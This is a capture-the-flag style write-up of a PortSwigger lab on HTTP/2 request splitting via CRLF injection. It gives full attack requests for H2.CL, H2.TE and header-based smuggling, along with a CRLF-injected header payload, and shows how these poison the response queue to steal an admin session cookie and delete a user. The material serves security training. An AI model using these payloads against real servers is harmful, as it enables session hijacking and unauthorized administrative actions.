# HTTP/2 request splitting via CRLF injection

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection), you'll learn: HTTP/2 request splitting via CRLF injection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user `carlos` by using [response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning) to break into the admin panel at `/admin`. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

> Note:
> This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
>  
> Please note that this feature is only available from [Burp Suite Professional / Community 2021.9.1](https://portswigger.net/burp/releases).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215180904.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215180932.png)

In here, we see the web application has a login page. If we can capture some users' requests, we could hijack their accont!

To do so, we can try to exploit **HTTP request smuggling vulnerability**.

**Now, we can try to send a HTTP/2 (HTTP version 2) request:**

> Note: To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215181300.png)
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215181317.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215181329.png)

As you can see, **the web application accepts HTTP/2**.

Now, we can try to test it's vulnerable to **H2.CL** (Front-end uses HTTP/2, back-end uses `Content-Length` header),or **H2.TE** (Back-end uses `Transfer-Encoding` header).

- H2.CL:

**Attack request:**
```http
POST / HTTP/2
Host: 0a260048048eb6b8c19b638500330014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404pls HTTP/1.1
Host: 0a260048048eb6b8c19b638500330014.web-security-academy.net
Content-Length: 25

smuggled=yes
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215181656.png)

Nope.

- H2.TE:

**Attack request:**
```http
POST / HTTP/2
Host: 0a260048048eb6b8c19b638500330014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215181807.png)

Still nope.

Hmm... We can also try to do **request smuggling via CRLF (Carriage Return `\r`, Line Feed `\n`) injection**.

In HTTP/2, we can downgrade the request to HTTP/1 (As you can see in the above attack requests). We can also perform response queue poisoning, which splitting a single HTTP request into exactly two complete requests on the back-end. In that attack, the split occurred inside the message body, but when HTTP/2 downgrading is in play, we can also cause this split to occur in the headers instead.

This approach is more versatile because we aren't dependent on using request methods that are allowed to contain a body. For example, we can even use a `GET` request:

```http
:method GET
:path /
:authority vulnerable-website.com
foo bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

This is also useful in cases where the `Content-Length` is validated and the back-end doesn't support chunked encoding.

But before we do that, we need to **accout for front-end rewriting**.

To split a request in the headers, we need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.

For example, we need to ensure that both requests received by the back-end contain a `Host` header. Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. There are different approaches for doing this, which can influence where you need to position the `Host` header that you're injecting.

Consider the following request:

```http
:method GET
:path /
:authority vulnerable-website.com
foo bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

During rewriting, some front-end servers append the new `Host` header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the `foo` header. Note that this is also after the point at which the request will be split on the back-end. This means that the first request would have no `Host` header at all, while the smuggled request would have two. In this case, we need to position your injected `Host` header so that it ends up in the first request once the split occurs:

```http
:method GET
:path /
:authority vulnerable-website.com
foo bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

We'll also need to adjust the positioning of any internal headers that we want to inject in a similar manner.

Armed with above information, let's **poison the response queue via request splitting and CRLF injection**:

- Adding a new header with CRLF injection:

```
Name: foo

Value: bar\r\n
\r\n
GET /404pls HTTP/1.1\r\n
Host: 0a260048048eb6b8c19b638500330014.web-security-academy.net
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215183428.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184037.png)

> Note: To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the `Shift + Return` keys. Note that this feature is not available when you double-click on the header.

**Then, send the request twice to fetch an arbitrary response, if we recieved a 404 response, that's our own poisoned 404 response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184257.png)

**Any other response code indicates that you have successfully captured a response intended for the admin user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184527.png)

Nice! We successfully captured admin user's session cookie!

**Let's modify our session cookie to the admin one!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184624.png)

**After that, go to the admin panel and delete user `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184647.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-14/images/Pasted%20image%2020230215184656.png)

# What we've learned:

1. HTTP/2 request splitting via CRLF injection